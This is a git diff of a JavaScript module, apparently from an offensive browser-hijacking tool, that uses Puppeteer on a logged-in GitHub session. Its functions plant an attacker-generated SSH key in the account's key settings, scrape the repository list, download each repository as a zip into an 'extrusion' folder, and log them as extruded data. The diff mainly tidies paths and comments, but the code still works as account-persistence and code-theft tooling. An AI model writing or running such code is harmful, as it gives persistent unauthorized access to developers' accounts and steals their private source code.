@@ -1,7 +1,5 @@
 const db = require('../../db/db')
-const necrohelp = require('../../tasks/helpers/necrohelp')
 const clusterLib = require('../../puppeteer/cluster')
-const crypto = require("crypto")
 const { writeFileSync } = require('fs');
 
 
@@ -27,9 +25,7 @@ exports.PlantSshKey = async function(page, taskId, sshKeyName, sshMaterial){
 
         console.log("writing private ssh key to file");
         // write the private key to a file using the taskId as filename for uniqueness
-        // clusterLib.GetConfig().platform.extrusionPath
-        // let keyPath = `${clusterLib.GetConfig().platform.extrusionPath}/${taskId}.key`
-        let keyPath = `/tools/necro/extrusion/${taskId}.key`
+        let keyPath = `extrusion/${taskId}.key`
 
 
         console.log(`[${taskId}] private key saved to ${keyPath}`);
@@ -37,7 +33,7 @@ exports.PlantSshKey = async function(page, taskId, sshKeyName, sshMaterial){
 
         // write the public key to a file using the taskId as filename for uniqueness
         // keyPath = `${clusterLib.GetConfig().platform.extrusionPath}/${taskId}.pub`
-        keyPath = `/tools/necro/extrusion/${taskId}.pub`
+        keyPath = `extrusion/${taskId}.pub`
 
         console.log(`[${taskId}] public key saved to ${keyPath}`);
         writeFileSync(keyPath, publicKey);
@@ -70,10 +66,6 @@ exports.PlantSshKey = async function(page, taskId, sshKeyName, sshMaterial){
         await page.goto('https://github.com/settings/keys');
         await page.screenshot({path: `extrusion/screenshot_${taskId}_keys.png`});
 
-
-        //let extrudedHashKey = `plantedSshKey_${sshKeyName}`
-        //await db.AddExtrudedData(taskId, extrudedHashKey, sshMaterial)
-
     }catch(e){
         console.log(`[${taskId}] error while planting SSH key: ${e.message}`)
         // print the line number of the error
@@ -86,8 +78,6 @@ exports.PlantSshKey = async function(page, taskId, sshKeyName, sshMaterial){
 exports.ScrapeRepos = async function(page, taskId) {
     await page.goto('https://github.com/settings/repositories')
 
-    // ANTI fix	
-    //let urls = await page.$$('div.Box-row.private.js-collab-repo > a')
     let urls = await page.$$('div.Box-row > a.mr-1')
 
     // TODO a warning or ignore should be thrown if the repo is too big
@@ -101,7 +91,7 @@ exports.ScrapeRepos = async function(page, taskId) {
     let reposToDownload = [];
     for(let url of urls){
         let href = await(await url.getProperty('href')).jsonValue();
-	href = href + "/archive/refs/heads/master.zip"    
+        href = href + "/archive/refs/heads/master.zip"
         reposToDownload.push(href);
         console.log(`[${taskId}] discovered repo at ${href}`)
     }
@@ -116,65 +106,20 @@ exports.DownloadRepo = async function (page, taskId, downloadUrl) {
         downloadPath: clusterLib.GetConfig().platform.extrusionPath
     }).catch(console.error)
 
- try{
-    	await page.goto(downloadUrl);
-	await page.waitForTimeout(10000);
-	
-	// ANTI simplified instead of clicking on Code button, just go on .zip url:
-	let archive = `${downloadUrl.split('/')[4]}-master.zip`;
-	let extrudedHashKey = `repository_${archive}`;
+    try{
+        await page.goto(downloadUrl);
+        await page.waitForTimeout(10000);
+
+        // ANTI simplified instead of clicking on Code button, just go on .zip url:
+        let archive = `${downloadUrl.split('/')[4]}-master.zip`;
+        let extrudedHashKey = `repository_${archive}`;
         await db.AddExtrudedData(taskId, extrudedHashKey, path);
 
         // wait for zip to download. we don't have much control here
- } catch(e){}
-    /*	 
-    // click on the Code green button
-    const codeButton = await page.$(".file-navigation > .d-none > get-repo > .position-relative > .btn");
-
-    let archive = `${downloadUrl.split('/')[4]}-master.zip`
-    let path = `${clusterLib.GetConfig().platform.extrusionPath}/${archive}`
-
-    // process next clicks including alert dialog ones
-    if (typeof codeButton !== 'undefined' && codeButton !== null){
-
-        console.log(`[${taskId}] downloading repo ${archive}`);
-        await page.click('.file-navigation > .d-none > get-repo > .position-relative > .btn').catch(console.error)
-
-        // click on the Download Zip last link
-        // NOTE this check handles the missing Open with GithubDesktop on platforms not supported.
-        // the div is missing so the nth-child count changes
-        let nthChild = 2;
-        if(clusterLib.GetConfig().platform.type === "freebsd"){
-            nthChild = 1;
-        }
-
-        await page.click('.dropdown-menu > div > .list-style-none > .Box-row:nth-child(' + nthChild + ') > .d-flex').catch(console.error)
-
-        let extrudedHashKey = `repository_${archive}`
-        await db.AddExtrudedData(taskId, extrudedHashKey, path)
-
-        // wait for zip to download. we don't have much control here
-        await page.waitForTimeout(10000)
-    }else{
-        console.log(`[${taskId}] repo ${archive} is missing the Code button. Ignoring it ...`)
-    } */
+    } catch(e){}
 }
 
 
-
-// generateKeyPair is a function that generates a public and private key pair
-// implementing this code:
-// let { publicKey, privateKey } = await generateKeyPair('rsa', {
-//     modulusLength: 4096,
-//     publicKeyEncoding: {
-//         type: 'spki',
-//         format: 'pem'
-//     },
-//     privateKeyEncoding: {
-//         type: 'pkcs8',
-//         format: 'pem',
-//     }
-// });
 // and returning both keys as strings
 function generateSSH(){
     const crypto = require("crypto")
@@ -194,15 +139,12 @@ function generateSSH(){
         },
     });
 
-
     const openSSHPublicKey = sshpk.parseKey(publicKey, 'pem').toString('ssh');
-
     console.log("====================================");
     console.log("publicKey:", publicKey);
     console.log("sshRsaPublicKey:", openSSHPublicKey);
     console.log("privateKey:", privateKey);
     console.log("====================================");
-
 
     return [openSSHPublicKey, privateKey];
 }
